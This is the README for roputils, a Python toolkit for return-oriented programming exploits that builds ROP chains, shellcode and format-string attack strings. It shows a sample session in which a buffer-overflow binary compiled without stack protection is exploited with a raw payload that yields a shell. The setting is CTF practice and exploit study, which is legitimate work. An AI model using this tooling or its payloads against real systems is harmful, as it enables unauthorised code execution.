# roputils

A Return-oriented Programming toolkit


## Usage

[examples/ropasaurusrex.py](examples/ropasaurusrex.py) is a write-up of PlaidCTF 2013 [ropasaurusrex](http://repo.shell-storm.org/CTF/PlaidCTF-2013/Pwnable/ropasaurusrex-200/).

Example scripts can be tested as below (getoffset requires gdb):

```
$ cd examples/

$ make
gcc -fno-stack-protector    bof.c   -o bof

$ make getoffset
python getoffset.py ./bof
120

$ python use-offset-x86-64.py ./bof 120
[+] read: '1\x04@\x00\x00\x00\x00\x001\x04@\x00\x00\x00\x00\x001\x04@\x00\x00\x00\x00\x001\x04@\x00\x00\x00\x00\x001\x04@\x00\x00\x00\x00\x001\x04@\x00\x00\x00\x00\x001\x04@\x00\x00\x00\x00\x001\x04@\x00\x00\x00\x00\x001\x04@\x00\x00\x00\x00\x001\x04@\x00\x00\x00\x00\x001\x04@\x00\x00\x00\x00\x001\x04@\x00\x00\x00\x00\x001\x04@\x00\x00\x00\x00\x001\x04@\x00\x00\x00\x00\x001\x04@\x00\x00\x00\x00\x00&\x06@\x00\x00\x00\x00\x00fZ6NlYRG\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x18\x10`\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00(\x10`\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x10\x06@\x00\x00\x00\x00\x00EkprOtWh\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00 \x10`\x00\x00\x00\x00\x00d\x00\x00\x00\x00\x00\x00\x00H\x14`\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x06@\x00\x00\x00\x00\x00Ls96gpQP\x00\x00\x00\x00\x00\x00\x00\x00@\x14`\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xce\x05@\x00\x00\x00\x00\x00'
got a shell!
id
uid=1000(user) gid=1000(user) groups=1000(user)
exit
*** Connection closed by remote host ***
```

## Overview

Currently roputils.py has the below classes:

* ELF: ELF parser (by readelf)
* ROP: ELF class with additional methods for creating ROP chains
* Shellcode: i386/x86-64/arm shellcode builder
* FormatStr: string builder for format string attack
* Proc: non-blocking IO for local/remote process
* Pattern: Metasploit pattern generator/calculator
* Asm: implementation of asm subcommand

roputils.py also can be used as CLI tool, the subcommands are:

* checksec: check security features (clone of [checksec.sh](http://www.trapkit.de/tools/checksec.html))
* pc: create Metasploit pattern
* po: calculate offset in Metasploit pattern
* gadget: check availability of tiny gadgets
* scan: grep the binary and disassemble from each index
* sc: output shellcode as hexstring
* asm: assemble/disassemble input (i386/x86-64/arm/thumb2)
* objdump: disassemble with IDA-like annotations

To list up the methods of each class, hit the below command in the same directory as roputils.py:

```
$ python -c 'import roputils as me; help(me)'
```

roputils.py is a single-file module, so your script can use it by creating a symlink in the same directory.

For more details, just read [the code](roputils.py).
